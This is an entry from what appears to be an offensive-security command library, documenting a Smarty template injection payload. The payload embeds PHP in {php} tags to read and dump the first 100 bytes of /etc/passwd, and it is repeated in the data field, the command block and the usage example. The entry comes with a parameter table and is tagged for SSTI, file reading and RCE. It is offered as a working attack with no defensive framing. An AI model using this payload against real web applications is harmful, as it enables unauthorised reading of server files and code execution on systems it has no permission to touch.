---
data: >-
  {php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100);
  var_dump($s);{/php}
tags:
  - ssti
  - file-reading
  - rce
type: command
executor: bash
platforms:
  - Web
  - Linux
id: f43f5d3f-3163-4643-8b88-06a58c7cc266
created_at: '2025-12-13T09:01:16.984Z'
updated_at: '2025-12-13T09:01:16.984Z'
verified: false
validated: true
submitted: true
---
# Smarty PHP File Get Contents

## Command

```bash
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
```

## Description

Executes PHP code to read the first 100 bytes of /etc/passwd and dump the variable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| path | File path (/etc/passwd) | Yes |
| maxlen | Max length (100) | Yes |
| offset | Offset (0) | Yes |
| context | Context (NULL) | No |
| use_include_path | Use include path (NULL) | No |

## Examples

### Basic Usage

```bash
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
```

## Expected Output

Partial content of /etc/passwd file dumped.

## Related

- [[procedures/Exploit-SSTI-for-Sensitive-File-Reading]]
